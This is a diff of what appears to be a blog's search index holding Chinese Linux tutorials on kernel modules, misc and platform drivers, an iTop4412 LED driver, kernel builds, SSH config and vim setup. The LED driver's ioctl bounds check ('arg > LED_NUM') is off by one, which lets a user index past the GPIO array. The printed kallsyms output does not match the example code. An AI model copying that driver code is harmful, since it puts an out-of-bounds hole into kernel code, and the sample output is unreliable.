卸载驱动函数的传入值为 platform_driver 类型， 即我们编写，将要实现的驱动程序。 12345678910111213struct platform_driver hello_driver = &#123; .probe = &amp;hello_probe, .remove = &amp;hello_remove, .shutdown = &amp;hello_shutdown, .suspend = &amp;hello_suspend, .resume = &amp;hello_resume, .driver = &#123; .name = DRIVER_NAME, //设备注册- 查看 $itop_kernel/ .owner = THIS_MODULE, &#125;&#125;; 其次定义并且实现 hello_driver; 此类型可查看 驱动 platform_driver 问题: probe_hello: disagrees about version of symbol module_layout 解决办法: ​ uname -r 查看系统内核版本， 同时查看 makefile 提供内核源码版本， 提供与系统内核版本对应一致的版本源码。 注意: 先注册platform_driver结构体， 使用probe 注册杂项设备， 设置两个 name. 或者 在 module_init 中直接使用 misc_register 注册杂项设备, 其效果相同。 如下: probe 示例源码 misc 示例源码 设备节点杂项设备的主设备号是10， 在任何Linux系统中它都是固定的。 杂项设备注册函数 12345678910111213141516include/linux/miscdevice.hstruct miscdevice &#123; int minor; // 设备号， 赋值为 MISC_DYNAMIC_MINOR const char *name; // 设备名称。 const struct file_operations *fops; //file_operations 结构体。 struct list_head list; struct device *parent; struct device *this_device; const char *nodename; mode_t mode;&#125;;extern int misc_register(struct miscdevice * misc);extern int misc_deregister(struct miscdevice *misc); 1extern int misc_register(struct miscdevice *misc); 杂项设备注册函数； 一般在probe中调用，参数为struct miscdevice 。 1extern int misc_deregister(struct miscdevice *misc); 杂项设备卸载函数；一般是在remove函数中用于卸载驱动。 完整代码 1234567891011121314151617static int __init hello_init(void)&#123; int miscstate = 0; //杂项设备； miscstate = misc_register(&amp;hello_device);// 区别: 不进行platform_match 匹配调用，直接注册设备。 printk(KERN_WARNING &quot;misc_register = %d\n&quot;, miscstate);&#125;static void __exit hello_exit(void)&#123; printk(KERN_WARNING &quot;hello_device exit\n&quot;); misc_deregister(&amp;hello_device); //删除杂项设备; return 0;&#125;module_init(hello_init);module_exit(hello_exit); ls /dev/ 即可看到我们创建的杂项设备节点： 10 crw------- 1 root root 10, 55 Dec 20 00:00 hello_device_name 即: 我们便可理解：设备节点，驱动名，设备名其实并无任何关系。 Linux file_operations结构体file_operations 结构体的成员函数属于驱动设计的主体内容， 里面的函数和Linux系统给应用程序提供系统接口一一对应。 file_operations 结构体位于 include/linux/fs.h, 定义为: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* * NOTE: * all file operations except setlease can be called without * the big kernel lock held in all filesystems. */struct file_operations &#123; struct module *owner; //一般是 THIS_MODULE loff_t (*llseek) (struct file *, loff_t, int); ssize_t (*read) (struct file *, char __user *, size_t, loff_t *); ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *); ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t); ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t); int (*readdir) (struct file *, void *, filldir_t); unsigned int (*poll) (struct file *, struct poll_table_struct *);/* remove by cym 20130408 support for MT660.ko */#if 0//#ifdef CONFIG_SMM6260_MODEM#if 1// liang, Pixtree also need to use ioctl interface... int (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);#endif#endif/* end remove */ long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);//与写功能稍微重合,主要针对IO口的控制。 long (*compat_ioctl) (struct file *, unsigned int, unsigned long); int (*mmap) (struct file *, struct vm_area_struct *); int (*open) (struct inode *, struct file *); //对应上层的open函数。打开文件。 int (*flush) (struct file *, fl_owner_t id); int (*release) (struct inode *, struct file *); //对应上层close函数，打开文件操作之后需要关闭。 int (*fsync) (struct file *, int datasync); int (*aio_fsync) (struct kiocb *, int datasync); int (*fasync) (int, struct file *, int); int (*lock) (struct file *, int, struct file_lock *); ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int); unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long); int (*check_flags)(int); int (*flock) (struct file *, int, struct file_lock *); ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int); ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int); int (*setlease)(struct file *, long, struct file_lock **); long (*fallocate)(struct file *file, int mode, loff_t offset, loff_t len);/* add by cym 20130408 support for MT6260 and Pixtree */#if defined(CONFIG_SMM6260_MODEM) || defined(CONFIG_USE_GPIO_AS_I2C) int (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);#endif/* end add */&#125;; iTop4412_leds.c 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/fs.h&gt;#include &lt;mach/gpio.h&gt;#include &lt;plat/gpio-cfg.h&gt;#include &lt;linux/miscdevice.h&gt;#include &lt;linux/platform_device.h&gt;//#include &lt;mach/gpio-bank.h&gt;#include &lt;mach/regs-gpio.h&gt;#include &lt;asm/io.h&gt;#include &lt;linux/regulator/consumer.h&gt;//#include "gps.h"#include &lt;linux/delay.h&gt;#define LEDS_DEBUG#ifdef LEDS_DEBUG#define DPRINTK(x...) printk("LEDS_CTL DEBUG:" x)#else#define DPRINTK(x...)#endif#define DRIVER_NAME "leds"#if defined(CONFIG_CPU_TYPE_SCP_ELITE) || defined(CONFIG_CPU_TYPE_POP_ELITE) || defined(CONFIG_CPU_TYPE_POP2G_ELITE)static int led_gpios[] = &#123; EXYNOS4_GPL2(0), EXYNOS4_GPK1(1),&#125;;#elif defined(CONFIG_CPU_TYPE_SCP_SUPPER) || defined(CONFIG_CPU_TYPE_POP_SUPPER) || defined(CONFIG_CPU_TYPE_POP2G_SUPPER)static int led_gpios[] = &#123;#if defined(CONFIG_MTK_COMBO_COMM) || defined(CONFIG_MTK_COMBO_COMM_MODULE) EXYNOS4_GPC0(2),#else EXYNOS4_GPX2(5),#endif EXYNOS4_GPX0(1),&#125;;#endif#define LED_NUM ARRAY_SIZE(led_gpios) int leds_open(struct inode *inode,struct file *filp)&#123; DPRINTK("Device Opened Success!\n"); return nonseekable_open(inode,filp);&#125;int leds_release(struct inode *inode,struct file *filp)&#123; DPRINTK("Device Closed Success!\n"); return 0;&#125;int leds_pm(bool enable)&#123; int ret = 0; printk("debug: LEDS PM return %d\r\n" , ret); return ret;&#125;;long leds_ioctl(struct file *file,unsigned int cmd,unsigned long arg)&#123; printk("debug: leds_ioctl cmd is %d\n" , cmd); switch(cmd) &#123; case 0: case 1: if (arg &gt; LED_NUM) &#123; //LED_NUM = 2 return -EINVAL; &#125; gpio_set_value(led_gpios[arg], cmd); break; default: return -EINVAL; &#125; return 0;&#125;//rokcy 将系统调用 和 驱动程序关联起来的关键数据结构; static struct file_operations leds_ops = &#123; .owner = THIS_MODULE, // 指向拥有这个结构的模块指针; .open = leds_open, //对设备文件进行的第一个操作; .release= leds_release, //文件结构被释放时引用这个操作： .unlocked_ioctl = leds_ioctl,//ioctl 系统调用提供了发出设备特定命令的方法.&#125;;static struct miscdevice leds_dev = &#123; .minor = MISC_DYNAMIC_MINOR, .fops = &amp;leds_ops, .name = "leds",&#125;;static int leds_probe(struct platform_device *pdev)&#123; int ret, i; char *banner = "leds Initialize\n"; printk(banner);// for(i=0; i&lt;LED_NUM; i++) &#123; ret = gpio_request(led_gpios[i], "LED"); if (ret) &#123; printk("%s: request GPIO %d for LED failed, ret = %d\n", DRIVER_NAME, led_gpios[i], ret); return ret; &#125; s3c_gpio_cfgpin(led_gpios[i], S3C_GPIO_OUTPUT); gpio_set_value(led_gpios[i], 1); &#125; ret = misc_register(&amp;leds_dev); if(ret&lt;0) &#123; printk("leds:register device failed!\n"); goto exit; &#125; return 0;exit: misc_deregister(&amp;leds_dev); return ret;&#125;static int leds_remove (struct platform_device *pdev)&#123; misc_deregister(&amp;leds_dev); return 0;&#125;static int leds_suspend (struct platform_device *pdev, pm_message_t state)&#123; DPRINTK("leds suspend:power off!\n"); return 0;&#125;static int leds_resume (struct platform_device *pdev)&#123; DPRINTK("leds resume:power on!\n"); return 0;&#125;//rokcy 此结构体 即函数定义; -- 针对不同信号响应信息;static struct platform_driver leds_driver = &#123; //驱动结构体; .probe = leds_probe, //rokcy 驱动调用初始化; .remove = leds_remove, //rocky 移除驱动函数 .suspend = leds_suspend,//rocky 休眠函数; .resume = leds_resume, //休眠后恢复驱动 .driver = &#123; .name = DRIVER_NAME, // 与 注册设备 name 一致; .owner = THIS_MODULE,// 赋值 THIS_MODULE &#125;,&#125;;static void __exit leds_exit(void)&#123; platform_driver_unregister(&amp;leds_driver);&#125;static int __init leds_init(void)&#123; return platform_driver_register(&amp;leds_driver); //[2] 驱动注册;&#125;module_init(leds_init); //rocky 初始化加载;module_exit(leds_exit);MODULE_LICENSE("Dual BSD/GPL"); 导出模块 以及符号的相互作用Linux2.6 内核的/proc/kallsyms 文件对应内核符号表，它记录了符号以及符号所在的内存地址，模块可以使用下列宏导到内核符号表中。 12EXPORT_SYMBOL(符号名) 任意模块均可EXPORT_SYMBOL_GPL(符号名) 只使用包含GPL许可权的模块 示例： 12345678910111213141516171819#include &lt;linux/module.h&gt; /*module_init()*/ #include &lt;linux/kernel.h&gt; /* printk() */ #include &lt;linux/init.h&gt; /* __init __exit */ int add_test(int a ,int b) &#123; return a + b; &#125; int sub_test(int a,int b) &#123; return a - b; &#125; EXPORT_SYMBOL(add_test); EXPORT_SYMBOL(sub_test); MODULE_AUTHOR(&quot;Rocky&quot;); MODULE_LICENSE(&quot;GPL&quot;); 执行cat /proc/kallsyms | grep test 即可找到以下信息，表示模块确实加载到内核表中。 12345678910f88c9008 r __ksymtab_sub_integar [export_symb] f88c9020 r __kstrtab_sub_integar [export_symb] f88c9018 r __kcrctab_sub_integar [export_symb] f88c9010 r __ksymtab_add_integar [export_symb] f88c902c r __kstrtab_add_integar [export_symb] f88c901c r __kcrctab_add_integar [export_symb] f88c9000 T add_tes [export_symb] f88c9004 T sub_tes [export_symb] 13db98c9 a __crc_sub_integar [export_symb] e1626dee a __crc_add_integar [export_symb] 在其它模块中可以引用此符号 123456789101112131415161718192021222324252627282930313233343536#include &lt;linux/module.h&gt; /*module_init()*/ #include &lt;linux/kernel.h&gt; /* printk() */ #include &lt;linux/init.h&gt; /* __init __exit */ #define DEBUG //open debug message #ifdef DEBUG #define PRINTK(fmt, arg...) printk(KERN_WARNING fmt, ##arg) #else #define PRINTK(fmt, arg...) printk(KERN_DEBUG fmt, ##arg) #endif extern int add_test(int a ,int b); extern int sub_test(int a,int b); static int __init hello_init(void) &#123; int a,b; a = add_test(10,20); b = sub_test(30,20); PRINTK("the add test result is %d",a); PRINTK("the sub test result is %d\n",b); return 0; &#125; static void __exit hello_exit(void) &#123; PRINTK(" Hello World exit\n "); &#125; module_init(hello_init); module_exit(hello_exit); MODULE_AUTHOR("Rocky"); MODULE_LICENSE("GPL"); platform 机制： 总线注册机制 Kernel_init() do_basic_setupo() driver_init() platform_bus_init() bus_register() 注册系统platform总线. 内核启动初始化，自动维护。 添加设备阶段: Platform_device_register() Platform_device_add() pdev-&gt;dev.bus = &amp;platform_bus_type &amp;&amp; device_add() 此步骤操作具体可以查看 $kernel/arch/arm/mach-exynos/mach-itop4412.c 驱动注册阶段: Platform_driver_register() driver_register() bus_add_driver() driver_attach() bus_for_each_dev() 对在每个挂载虚拟的platform bus的设备做 driver_attach（）-&gt; driver_probe_device() 判断drv-&gt;bus-&gt;match() 是否执行成功， 此时通过指针执行platform_match（） 对比name。 知识点: proc 目录是虚拟文件系统， 可以为Linux用户空间和内核空间提供交互， 它存在于内存中， 而不占用实际的flash或者硬盘空间。 /proc/devices/ 里面的设备是加载驱动程序生成的， 即现有驱动创建信息。 /dev/ 下的设备是通过创建设备节点生成的。用户通过此设备节点访问内核驱动。 即系统挂载的实际设备。 /sys/devices/ 里面的设备都是系统初始化， make zImage 编译后注册的新设备。 /proc/misc 查看pc机Ubuntu系统的杂项设备。 /sys/module 查看模块信息， 即lsmod信息 Linux_设备驱动 platform设备驱动]]></content>
+      <categories>
+        <category>Kernel</category>
+      </categories>
       <tags>
-        <tag>Arm</tag>
         <tag>Linux</tag>
+        <tag>Arm</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -863,6 +877,9 @@
     <title><![CDATA[Kernel-内核版本命令规则]]></title>
     <url>%2F2017%2F11%2F01%2Fkernel%2FKernel-%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC%E5%91%BD%E4%BB%A4%E8%A7%84%E5%88%99%2F</url>
     <content type="text"><![CDATA[Linux内核版本有两种：稳定版和开发版 ，Linux内核版本号由3个数字组成：r.x.y r：目前发布的内核主版本。 x：偶数表示稳定版本；奇数表示开发中版本。 y：错误修补的次数。 内核版本号每位都代表什么 ? ​ 以版本号为例： 2.6.9-5.ELsmp , ​ r: 2 , 主版本号 ​ x: 6 , 次版本号，表示稳定版本 ​ y: 9 , 修订版本号 ， 表示修改的次数 头两个数字合在一齐可以描述内核系列。如稳定版的2.6.0，它是2.6版内核系列。 ​ 5: 表示这个当前版本的第5次微调patch ， 而ELsmp指出了当前内核是为ELsmp特别调校的 ​ EL : Enterprise Linux ； smp : 表示支持多处理器 ， 表示该内核版本支持多处理器 知识延伸 一般的有三种: smp bigmem 一般的内核 ​ Red Hat Linux开机的时候，GRUB的启动菜单会有两个选项，分别是 Red Hat Enterprise Linux ES (版本号.ELsmp) Red Hat Enterprise Linux ES-up (版本号.EL) 这两个分别是代表什么含义呢? 其实这个就是系统开机时由GRUB引导启动 － 单处理器 与 对称多处理器启动核心文件的区别。 Red Hat Enterprise Linux ES (版本号.ELsmp) multiple processor (symmetric multiprocessing ) Red Hat Enterprise Linux ES-up (版本号.EL) uniprocessor 下面就把SUSE与Red Hat启动菜单内可选择的选项，列举出来 SUSE: 版本号-default: SUSE Linux kernel for uniprocessor machines 默认选项，支持单处理器机器 版本号-smp: SUSE Linux kernel that supports symmetric multiprocessing and up to 4 GB of RA 支持4GB内存的对称多处理器机器 版本号-bigsmp: SUSE Linux kernel supports symmetric multiprocessing and up to 64 GB 支持64GB内存的对称多处理器机器 Red Hat Linux 版本号.EL: Red Hat Linux kernel for uniprocessor machines 支持单处理器机器 版本号.ELhugemem: Red Hat Linux kernel that supports up to 64 GB of RAM 支持64GB内存的对称多处理器机器 版本号.ELsmp: Red Hat Linux kernel that supports symmetric multiprocessing 对称多处理器机器，支持4G内存]]></content>
+      <categories>
+        <category>Kernel</category>
+      </categories>
       <tags>
         <tag>Linux</tag>
         <tag>Kernel</tag>
@@ -873,7 +890,7 @@
     <url>%2F2017%2F10%2F28%2Fsoftware%2FGithub-SSh-key%E4%BB%A5%E5%8F%8A%E5%A4%9A%E4%B8%AArsa%E9%85%8D%E7%BD%AE%2F</url>
     <content type="text"><![CDATA[生成SSH key Github 添加公钥 ssh/config写法 config权限 生成SSH Key在shell中键入以下命令:ssh-keygen -t rsa -C &quot;your_email@example.com&quot; 将会提示输入存放秘钥的文件名。以及密码。 命令完成后会生成两个文件 id_rsa私钥和id_rsa.pub公钥，将其放置于 ~/.ssh/ 目录下。 GitHub添加公钥拷贝 id_rsa.pub 中内容，添加到github的ssh-key的配置中。 多个rsa文件时在 ~/.ssh/ 编写config文件 1234567891011Host aaa.com User git HostName aaa.com PreferredAuthentications publickey IdentityFile ~/.ssh/id_rsa.gitlab_postgres # githubHost github.com HostName github.com PreferredAuthentications publickey IdentityFile ~/.ssh/github_rsa config权限问题123456Cloning into &apos;REL_10_HG_Rman&apos;...Bad owner or permissions on /home/Postgres/.ssh/configfatal: Could not read from remote repository.Please make sure you have the correct access rightsand the repository exists. 更改权限为: 1sudo chmod 0600 config 参考Linux-SSH公钥登陆服务器]]></content>
       <categories>
-        <category>Github</category>
+        <category>命令</category>
       </categories>
       <tags>
         <tag>Linux</tag>
@@ -1000,9 +1017,12 @@
     <title><![CDATA[编译Linux内核]]></title>
     <url>%2F2017%2F09%2F10%2Fkernel%2F%E7%BC%96%E8%AF%91Linux%E5%86%85%E6%A0%B8%2F</url>
     <content type="text"><![CDATA[前言: Linux内核是操作系统的核心，也是操作系统最基本的部分。 Linux内核的体积结构是单内核的、但是他充分采用了微内核的设计思想、使得虽然是单内核、但工作在模块化的方式下、并且这个模块可以动态装载或卸 载；Linux负责管理系统的进程、内存、设备驱动程序、文件和网络系统，决定着系统的性能和稳定性。如是我们在了解Linux内核的基础上根据自己的需要、量身定制一个更高效，更稳定的内核，就需要我们手动去编译和配置内核里的各项相关的参数和信息了。注意: 如果两个内核模块的版本不完全相同是不可以跨版本使用的。 正文: 获取内核源码， 并进行解压 内核下载 1tar -xvf linux-xxx.tar.gz ​ 配置内核特性(选择一种方法就可以了) 现有编译选项: 123456make config：遍历选择所要编译的内核特性make allyesconfig：配置所有可编译的内核特性make allnoconfig：并不是所有的都不编译make menuconfig：这种就是打开一个文件窗口选择菜单make kconfig(KDE桌面环境下，并且安装了qt开发环境)make gconfig(Gnome桌面环境，并且安装gtk开发环境) 内核模块 1234567891011121314151617[*] 64-bit kernel # 64bit 支持 General setup ---&gt; # 基本设置[*] Enable loadable module support ---&gt; # 模块加载支持-*- Enable the block layer ---&gt; # 块设备层支持 Processor type and features ---&gt; # 处理器类型和特性选择 Power management and ACPI options ---&gt; # 电源管理功能 Bus options (PCI etc.) ---&gt; # 总线选项 Executable file formats / Emulations ---&gt; # 可执行文件格式-*- Networking support ---&gt; # 网络支持 Device Drivers ---&gt; # 设备驱动 Firmware Drivers ---&gt; # 固件驱动 File systems ---&gt; # 文件系统 Kernel hacking ---&gt; # 内核技巧 Security options ---&gt; # 安全选项-*- Cryptographic API ---&gt; # 密码相关API[*] Virtualization ---&gt; # 虚拟化 Library routines ---&gt; # 函式库 基本设置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556[ ] Prompt for development and/or incomplete code/drivers # 尚未完成开发的代码或驱动，求稳不选 ( ) Cross-compliler tool prefix # 交叉编译前缀，用不到不选 ( ) Local version - append to kernel release[ ] Automatically append version infomation to the version string # 以上两项用于自定义内核的版本描述，无意义不设 Kernel compression mode (XZ) ---&gt; # 内核压缩算法，有 Gzip,Bzip2,LZMA,XZ,LZO 几个选项 # 选择了较新的 XZ ，有较高的压缩比和解压缩速度( ) Default hostname # 用户未设置 hostname 时的默认值，无意义不设 [*] Support for paging of anonymous memory (swap) # swap 虚拟内存支持，必选[*] System V IPC # 进程间通信，必选[ ] Open by fhandle syscalls # 支持通过文件句柄的系统调用，开发文件系统时可能用到，一般用户可不选 [ ] Auditing support [ ] Enable system-call auditing support [ ] Make audit loginuid immutable # 审计支持，安装 SELinux 必选，但会拖慢系统，一般用户可不选 IRQ Subsystem ---&gt;# 中断请求子系统，64位系统下面木有选项，免选了Timers Subsystem ---&gt; [*] Tickless System (Dynamic Ticks) # 计时子系统，Tickless系统可降能耗，选上 [ ] High Resolution Timer Support # 高精度计时器需要硬件支持，一般硬件不支持，不选CPU/Task time and stats accounting ---&gt; Cputime accounting (Simple tick based cputime accounting) ---&gt; (X) Simple tick based cputime accounting ( ) Fine granularity task level IRQ time accounting # 统计进程占用CPU时间的方式，这里选择 Simple tick 方式 [*] BSD Process Accounting # 将进程的统计信息写入文件，支持用户级系统调用，必选 [*] BSD Process Accounting version 3 file format # 使用第三版文件格式，不兼容老版本，淘汰老文件格式，选了 [ ] Export task/process statistics through netlink (EXPERIMENTAL) # 通过netlink接口向用户空间导出统计信息，可不选 [ ] Enable per-task delay accounting (EXPERIMENTAL) # 在统计信息中包含进程等待资源所花费的时间，可不选 [ ] Enable extended accounting over taskstats (EXPERIMENTAL) [ ] Enable pre-task storage I/O accounting (EXPERIMENTAL) # 在统计信息中包含额外的信息，可不选 ​ 编译内核 123make -j x // x号最多为CPU物理核心总数的两倍，这样会快点哦 make headers // 很多Makefile 不在支持make modules ​ 安装内核模块 12make header_install //可忽略make modules_install ​ 安装内核 1make install #会自动更新grub.conf 文件 若失败 update-grub2 手动执行，并查看文件是否更新 ​ 验证并测试 12cat /boot/grub/grub.conf查看新内核是否已经添加, 而后重启系统并测试 ​ 清理 1234make mrproper命令会删除所有的编译生成文件、内核配置文件(.config文件)和各种备份文件，所以几乎只在第一次执行内核编译前才用这条命令。 #重新配置make menuconfig 之前运行make clean命令则是用于删除大多数的编译生成文件，但是会保留内核的配置文件.config，还有足够的编译支持来建立扩展模块。所以你若只想删除前一次编译过程的残留数据，只需执行make clean命令。执行make mrproper 之前 会先调用 make clean; ​ ​ 单内核, 微内核: 单内核(宏内核): 单内核将操作系统从整体作为一个单独的大过程来实现，同时也运行在一个单独的地址空间上。这样的内核通常以单个静态二进制文件的形式存放于磁盘中。 各个进程，模块都运行在内核态，并处于同一地址空间: 内核可以直接调用 微内核: 微内核的功能被划分为多个独立过程，每个过程叫做一个服务器 只有强烈请求特权服务的服务器才运行在特权模式下，其他服务运行在用户空间 所有服务都保持独立并运行在各自的地址空间中( 通过 消息传递处理微内核通讯 IPC机制等) IPC机制开销多余函数调用，且涉及内核空间和用户空间的上下文切换 Linux内核是单内核:(Linux内核运行在单独的内核地址空间上) Linux引用模块化设计，抢占式内核，支持内核线程以及动态装载内核模块 很多服务运行在内核态，即避免IPC调用，直接采用函数调用 ​]]></content>
+      <categories>
+        <category>Kernel</category>
+      </categories>
       <tags>
-        <tag>Arm</tag>
         <tag>Linux</tag>
+        <tag>Arm</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -1010,9 +1030,12 @@
     <title><![CDATA[内核模块hello_module介绍]]></title>
     <url>%2F2017%2F09%2F08%2Fkernel%2F%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97-hello-module%E4%BB%8B%E7%BB%8D%2F</url>
     <content type="text"><![CDATA[Linux内核结构: Device Drivers 设备驱动 Linux 内核中大量代码在设备驱动程序部分，用于控制特定的硬件设备 Linux 驱动一般分为网络设备， 块设备， 字符设备， 杂项设备 网络协议栈 内核网络协议栈为Linux提供了丰富的网络协议实现 ​ 1. 准备工作 Debian: 编译内核模块的准备 1sudo apt-get install module-assistant #获取模块助手 Fedora: kernel-dedel 包包含了编译Fedora内核模块的所有必要文档和工具 1sudo yum install kernel-devel 内核源码下载: http://kernel.org 将内核放置到非超级用户目录下： 尽量少用sudo 等提权命令 cd linux-&lt;version&gt;make menuconfig 生成 .config 规则文件 ​ make help 帮助文档 Configuration targets: ​ menuconfig - Update current config utilising a menu based program​ oldconfig - Update current config utilising a provided .config as base Other generic targets: ​ all - Build all targets marked with [*]​ vmlinux - Build the bare kernel​ modules - Build all modules Kernel packaging: ​ rpm-pkg - Build both source and binary RPM kernel packages​ binrpm-pkg - Build only the binary kernel RPM package​ deb-pkg - Build both source and binary deb kernel packages​ bindeb-pkg - Build only the binary kernel deb package​ tar-pkg - Build the kernel as an uncompressed tarball​ targz-pkg - Build the kernel as a gzip compressed tarball​ tarbz2-pkg - Build the kernel as a bzip2 compressed tarball​ tarxz-pkg - Build the kernel as a xz compressed tarball Linux kernel internal documentation in different formats (DocBook): ​ htmldocs - HTML​ pdfdocs - PDF​ psdocs - Postscript​ xmldocs - XML DocBook​ mandocs - man pages​ installmandocs - install man pages generated by mandocs to INSTALL_MAN_PATH ​ (default: ./usr) ​ cleandocs - clean all generated DocBook files sudo tar -C / -xvf linux-&lt;version&gt;.tar 安装内核 / make modules_install / make install ​ 内核配置: 使用menuconfig #make menuconfig 生成.config配置文件 2. 驱动模块编程: ​ printk相当于printf的孪生姐妹，她们一个运行在用户态，另一个则在内核态被人们所熟知。但是根据不同的操作系统也会有不一样的效果，例如编写一个hello word 内核模块，使用这个函数不一定会将内容显示到终端上，但是一定在内核缓冲区里，可以使用dmesg.查看效果。 hello内核模块功能: ​ printk 在内核中打印信息 ​ 输出到内核的消息缓存kernel Message buffer 并拷贝到 /var/log/message中 /var/log/syslog /var/log/kern.log hello_module 模块下载 编写Hello Module必要头文件: &lt;linux/module.h&gt; 12MODELE_LICENSE(_license) 遵循开放协议 GPLMODULE_AUTHOR(_author) 代码作者 &lt;linux/init.h&gt; 包含初始化宏定义的头文件。 12module_init(x) module_exit(x) 模块编写: hello_printk.c: 123456789101112131415161718192021#include &lt;linux/init.h&gt; // 模块加载;#include &lt;linux/module.h&gt; // GPL协议MODULE_LICENSE("Dual BSD/GPL");//可无;MODULE_AUTHOR("Rocky_Ansi");// __init关键字告诉内核这个代码只会被运行一次，而且是在内核装载的时候。static int __init hello_init(void)&#123; printk(KERN_WARNING "Welcome hello-module init\n"); return 0;&#125;// __exit关键字告诉内核这段代码只在内核模块被卸载的时候运行一次.static void __exit hello_exit(void)&#123; printk(KERN_WARNING "Byebye hello-module exit\n");&#125;module_init(hello_init);module_exit(hello_exit); ​ Makefile: 123456789101112131415161718192021222324#!/bin/bash#obj-m指出将要编译成的内核模块列表。.o格式文件会自动地有相应的.c文件生成#y build directly into the kernel#n leave entirely out of the kernel#m Build as a module, to be loaded if needed.#? print a bried descriptive message and repeat the prompt.obj-m += hello.o#CFLAGS += /home/Postgres/ubuntu-src/iTop4412_Kernel_3.0/include #KDIR表示是内核源代码的位置。 链接到包含着正在使用内核对应源代码的目录树位置。KDIR := /home/Postgres/ubuntu-src/iTop4412_Kernel_3.0#PWD指示了当前工作目录并且是我们自己内核模块的源代码位置PWD ?= $(shell pwd)#M= 指定hello.c Makefile所在目录 all: make -C $(KDIR) $(CFLAGS) M=$(PWD) modules.PHONY:clean: rm -rf *.o 编译流程: 第一条红线: 进入Linux源码中，调用版本信息 以及 一些头文件。 整个Linux的源码文件 第二条橙线: 搜索完Linux源码树的信息之后,Makefile继续运行，调用编译.KO 文件的源码文件。 hello_module.c 文件。 3. 生成ko模块make #发现缺失 &lt;bound.h&gt; 等头文件解决:12cd kernel-&amp;lt;version&amp;gt;sudo make oldconfig &amp;&amp; sudo make prepare // 产生缺失的必须模块文件 4. 挂载, 移除， 查看ko模块信息;1234insmod 加载模块 dmesg |grep hello -- 可以查看模块输出到内核信息；lsmod 查看模块rmmod 卸载模块命令 printk函数 - IBM 陈皓 - 内核模块]]></content>
+      <categories>
+        <category>Kernel</category>
+      </categories>
       <tags>
-        <tag>Arm</tag>
         <tag>Linux</tag>
+        <tag>Arm</tag>
         <tag>Kernel</tag>
       </tags>
   </entry>
@@ -1069,7 +1092,7 @@
     <url>%2F2017%2F08%2F16%2Fsoftware%2Fvim%E9%85%8D%E7%BD%AEctags-taglist%2F</url>
     <content type="text"><![CDATA[基于CentOS Linux release 7.1.1503 (Core) 安装 ctags1yum -y install ctags 安装taglist123456789taglist├── doc│ └── taglist.txt└── plugin └── taglist.vim sudo cp taglist/doc/taglist.txt /usr/share/vim/vim74/doc/ sudo cp taglist/plugin/taglist.vim /usr/share/vim/vim74/plugin/ 配置 .vimrc123456789101112131415161718192021222324252627282930&quot; 设置忽略大小写;set ignorecase&quot; 设置tab 4空格;set tabstop=4set softtabstop=4set shiftwidth=4set expandtab&quot;对齐风格set cino=g0,:0&quot;设置行号set number&quot;共享粘贴板;set mouse=a&quot;自动缩进 与C语言峰哥;set autoindentset cindent&quot; 设置ctags 往上查找;set tags=tags;/let Tlist_Auto_Open=1 &quot;自动打开let Tlist_Show_One_File=1 &quot;只显示当前文件的tagslet Tlist_WinWidth=40 &quot;设置taglist宽度let Tlist_Exit_OnlyWindow=1 &quot;taglist窗口是最后一个窗口let Tlist_Use_Left_Window=1 &quot;在Vim窗口右侧显示taglist窗口; 使用123## 重新生成tags文件ctags -R * vim src/main.c ## 即可显示taglist窗口; 快捷键 help tags ctrl+] 打开并跳转到函数定义处 ctrl+t 返回到上一个标签处 g+] 在当前窗口下显示tag索引信息]]></content>
       <categories>
-        <category>Vim篇</category>
+        <category>Vim</category>
       </categories>
       <tags>
         <tag>Linux</tag>
@@ -1081,7 +1104,7 @@
     <url>%2F2017%2F08%2F16%2Fsoftware%2FWindow-DevDocs%2F</url>
     <content type="text"><![CDATA[devdocs是一个开源的文档浏览应用。跟dash一样，它把HTML源文档转换成带索引的docset规格，以供用户查看。不过devdocs是一个用rails写的web应用而非本地应用，文档作为静态资源由服务器提供，交互则是通过浏览器页面完成。你可以在devdocs.io使用该应用，也可以在自己的电脑上部署它。注意devdocs提供了offline的选项，可以把数据写入到浏览器的indexeddb中，避免了每次从服务器获取数据带来的延迟。 访问网址： http://devdocs.io/ 本地访问: 即可缓存到浏览器本地;]]></content>
       <categories>
-        <category>工具篇</category>
+        <category>工具</category>
       </categories>
       <tags>
         <tag>Software</tag>
@@ -1124,8 +1147,8 @@
         <category>Database</category>
       </categories>
       <tags>
-        <tag>Database</tag>
         <tag>Postgresql</tag>
+        <tag>Database</tag>
       </tags>
   </entry>
   <entry>
@@ -1173,13 +1196,15 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Netcat 网络攻击 以及 应用]]></title>
-    <url>%2F2017%2F07%2F09%2Fkali%2FNetCat%E5%AD%A6%E4%B9%A0%E4%BB%8B%E7%BB%8D%2F</url>
